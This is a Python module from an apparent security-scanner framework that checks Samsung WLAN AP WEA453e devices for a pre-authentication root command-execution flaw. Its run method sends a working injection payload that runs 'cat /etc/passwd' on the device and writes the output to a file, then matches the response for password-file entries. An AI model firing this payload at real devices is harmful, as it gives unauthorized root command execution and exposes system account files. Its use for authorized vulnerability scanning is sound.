#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Samsung WLAN AP WEA453e is vulnerable to a pre-auth root remote command execution vulnerability, which means a."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Samsung WLAN AP WEA453e - Remote Code Execution Detection',
        'description': 'Samsung WLAN AP WEA453e is vulnerable to a pre-auth root remote command execution vulnerability, which means an attacker could run code as root remotely without logging in.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'samsung', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://omriinbar.medium.com/samsung-wlan-ap-wea453e-vulnerabilities-7aa4a57d4dba'],
    }

    def run(self):
        path = '/(download)/tmp/poc.txt'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'bin:.*:1:1',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='critical',
                reason='Samsung WLAN AP WEA453e - Remote Code Execution detected',
                path=path,
            )
            return True
        return False

